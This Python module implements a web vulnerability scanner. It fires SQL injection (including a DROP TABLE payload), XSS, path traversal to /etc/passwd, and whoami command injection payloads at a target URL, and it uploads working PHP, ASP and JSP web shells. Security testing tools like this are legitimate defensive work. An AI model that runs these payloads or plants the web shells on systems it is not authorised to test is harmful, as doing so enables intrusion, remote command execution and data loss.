# app/core/web_scanner.py
import requests
import re
import urllib.parse
from typing import Dict, List, Optional
from PyQt6.QtCore import QObject, pyqtSignal
from app.core.license_manager import license_manager

class WebScanner(QObject):
    """Advanced web application security scanner"""
    
    scan_event = pyqtSignal(str, str, dict)  # event_type, message, data
    
    def __init__(self):
        super().__init__()
        self.session = requests.Session()
        self.vulnerabilities = []
        
    def scan_sql_injection(self, url: str, params: Dict = None) -> List[Dict]:
        """Test for SQL injection vulnerabilities"""
        if not license_manager.is_feature_enabled('web_scanner'):
            return []
            
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "1' AND 1=1--",
            "1' AND 1=2--"
        ]
        
        vulnerabilities = []
        
        for payload in payloads:
            try:
                if params:
                    test_params = params.copy()
                    for key in test_params:
                        test_params[key] = payload
                    response = self.session.get(url, params=test_params, timeout=10)
                else:
                    test_url = f"{url}?id={payload}"
                    response = self.session.get(test_url, timeout=10)
                
                # Check for SQL error indicators
                sql_errors = [
                    "mysql_fetch_array",
                    "ORA-01756",
                    "Microsoft OLE DB",
                    "SQLServer JDBC Driver",
                    "PostgreSQL query failed"
                ]
                
                if any(error in response.text.lower() for error in sql_errors):
                    vulnerabilities.append({
                        'type': 'SQL Injection',
                        'severity': 'High',
                        'payload': payload,
                        'url': response.url,
                        'evidence': response.text[:200]
                    })
                    
            except Exception as e:
                continue
                
        return vulnerabilities
        
    def scan_xss(self, url: str, params: Dict = None) -> List[Dict]:
        """Test for XSS vulnerabilities"""
        if not license_manager.is_feature_enabled('web_scanner'):
            return []
            
        payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>"
        ]
        
        vulnerabilities = []
        
        for payload in payloads:
            try:
                if params:
                    test_params = params.copy()
                    for key in test_params:
                        test_params[key] = payload
                    response = self.session.get(url, params=test_params, timeout=10)
                else:
                    test_url = f"{url}?q={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                
                if payload in response.text:
                    vulnerabilities.append({
                        'type': 'Cross-Site Scripting (XSS)',
                        'severity': 'Medium',
                        'payload': payload,
                        'url': response.url,
                        'evidence': 'Payload reflected in response'
                    })
                    
            except Exception as e:
                continue
                
        return vulnerabilities
        
    def scan_directory_traversal(self, url: str) -> List[Dict]:
        """Test for directory traversal vulnerabilities"""
        if not license_manager.is_feature_enabled('web_scanner'):
            return []
            
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        vulnerabilities = []
        
        for payload in payloads:
            try:
                test_url = f"{url}?file={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
                
                # Check for file content indicators
                if ("root:" in response.text or 
                    "localhost" in response.text or
                    "[boot loader]" in response.text.lower()):
                    
                    vulnerabilities.append({
                        'type': 'Directory Traversal',
                        'severity': 'High',
                        'payload': payload,
                        'url': response.url,
                        'evidence': 'System file content detected'
                    })
                    
            except Exception as e:
                continue
                
        return vulnerabilities
        
    def scan_command_injection(self, url: str, params: Dict = None) -> List[Dict]:
        """Test for command injection vulnerabilities"""
        if not license_manager.is_feature_enabled('web_scanner'):
            return []
            
        payloads = [
            "; whoami",
            "| whoami",
            "&& whoami",
            "`whoami`",
            "$(whoami)"
        ]
        
        vulnerabilities = []
        
        for payload in payloads:
            try:
                if params:
                    test_params = params.copy()
                    for key in test_params:
                        test_params[key] = f"test{payload}"
                    response = self.session.get(url, params=test_params, timeout=10)
                else:
                    test_url = f"{url}?cmd=test{urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                
                # Check for command output indicators
                if (re.search(r'(root|administrator|system)', response.text, re.I) or
                    "uid=" in response.text or
                    "gid=" in response.text):
                    
                    vulnerabilities.append({
                        'type': 'Command Injection',
                        'severity': 'Critical',
                        'payload': payload,
                        'url': response.url,
                        'evidence': 'Command execution detected'
                    })
                    
            except Exception as e:
                continue
                
        return vulnerabilities
        
    def scan_file_upload(self, url: str) -> List[Dict]:
        """Test for file upload vulnerabilities"""
        if not license_manager.is_feature_enabled('web_scanner'):
            return []
            
        vulnerabilities = []
        
        # Test malicious file uploads
        test_files = {
            'shell.php': '<?php system($_GET["cmd"]); ?>',
            'shell.asp': '<%eval request("cmd")%>',
            'shell.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
        }
        
        for filename, content in test_files.items():
            try:
                files = {'file': (filename, content, 'text/plain')}
                response = self.session.post(url, files=files, timeout=10)
                
                if (response.status_code == 200 and 
                    ("uploaded" in response.text.lower() or
                     "success" in response.text.lower())):
                    
                    vulnerabilities.append({
                        'type': 'File Upload Vulnerability',
                        'severity': 'High',
                        'payload': filename,
                        'url': url,
                        'evidence': 'Malicious file upload accepted'
                    })
                    
            except Exception as e:
                continue
                
        return vulnerabilities
        
    def comprehensive_scan(self, url: str, params: Dict = None) -> Dict:
        """Perform comprehensive web application scan"""
        if not license_manager.is_feature_enabled('web_scanner'):
            return {'error': 'Web scanner requires Professional license'}
            
        self.scan_event.emit('scan_started', f'Starting comprehensive scan of {url}', {})
        
        all_vulnerabilities = []
        
        # SQL Injection
        self.scan_event.emit('scan_progress', 'Testing SQL Injection...', {})
        all_vulnerabilities.extend(self.scan_sql_injection(url, params))
        
        # XSS
        self.scan_event.emit('scan_progress', 'Testing Cross-Site Scripting...', {})
        all_vulnerabilities.extend(self.scan_xss(url, params))
        
        # Directory Traversal
        self.scan_event.emit('scan_progress', 'Testing Directory Traversal...', {})
        all_vulnerabilities.extend(self.scan_directory_traversal(url))
        
        # Command Injection
        self.scan_event.emit('scan_progress', 'Testing Command Injection...', {})
        all_vulnerabilities.extend(self.scan_command_injection(url, params))
        
        # File Upload
        if url.endswith('/upload') or 'upload' in url:
            self.scan_event.emit('scan_progress', 'Testing File Upload...', {})
            all_vulnerabilities.extend(self.scan_file_upload(url))
        
        # Generate report
        report = {
            'target': url,
            'total_vulnerabilities': len(all_vulnerabilities),
            'critical': len([v for v in all_vulnerabilities if v['severity'] == 'Critical']),
            'high': len([v for v in all_vulnerabilities if v['severity'] == 'High']),
            'medium': len([v for v in all_vulnerabilities if v['severity'] == 'Medium']),
            'vulnerabilities': all_vulnerabilities
        }
        
        self.scan_event.emit('scan_completed', f'Scan completed: {len(all_vulnerabilities)} vulnerabilities found', report)
        
        return report

# Global web scanner instance
web_scanner = WebScanner()